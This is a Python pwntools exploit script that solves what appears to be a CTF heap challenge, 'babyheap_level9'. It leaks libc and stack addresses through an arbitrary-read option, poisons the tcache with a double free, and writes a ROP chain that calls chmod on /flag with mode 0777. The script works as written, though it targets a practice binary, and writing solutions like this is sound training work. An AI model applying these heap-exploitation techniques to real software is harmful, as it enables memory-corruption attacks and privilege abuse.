#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '/challenge/babyheap_level9')
os.chdir('/challenge')
context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break print_menu
continue
'''.format(**locals())

io = start()
END_OF_MENU = b"Choice:"

def malloc(p, size, content):
    p.sendline(b"1")
    p.recvuntil(b"chunk?:")
    p.sendline(b"%d" % (size))
    p.recvuntil(b"Content:")
    p.sendline(b"%b" % (content))
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"2")
    print(p.recvline())
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    
    p.recvuntil(b"content:")
    p.sendline(b"%b" % (content)) 
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

def arbitary_read(p, value):
    libc_offset = 0xb1690
    p.sendline(b"7")
    p.recvuntil(b"format):")
    p.sendline(b"%d" % (value))
    p.recvuntil("value is:")
    result =  int(p.recvline(keepends=False), 16)
    p.recvuntil(END_OF_MENU)
    return result

def launch_attack(p):
    libc_base = arbitary_read(p, 4210736) -0xb1690 #0xb1690 -> vmmap libc_base - arbitarty read base
    print('libc_base: ', hex(libc_base))
    environ_var = libc_base + 0x3ee098 #objdump -T libc.so.6 | grep environ
    environ_stack = arbitary_read(p, environ_var)
    print('environ_stack: ', hex(environ_stack))
    ret_add = environ_stack - 352
    print('add_chunk_rip:', hex(ret_add))

    pop_rdi = 0x2155f
    pop_rsi = 0x23e8a
    mov_eax = 0x10fbd0  #: mov eax, 0x5a ; syscall
    leave_ret = 0x34d33 #: leave ; ret

    def rop_chain():
        return b"/flag\0\0\0" + p64(libc_base + pop_rdi) + p64(ret_add - 8) + p64(libc_base + pop_rsi) + p64(0o777) + p64(libc_base + mov_eax) + p64(libc_base + leave_ret)
    print(len(rop_chain()))
    malloc(p, 64, b'a')
    malloc(p, 64, b'a')

    free(p, 0)
    free(p, 0)
    content = p64(ret_add - 8)
    malloc(p, 64, content)
    malloc(p, 64, b'a')
    malloc(p, 64, rop_chain())
    


    p.interactive()

io.recvuntil(END_OF_MENU)
launch_attack(io)
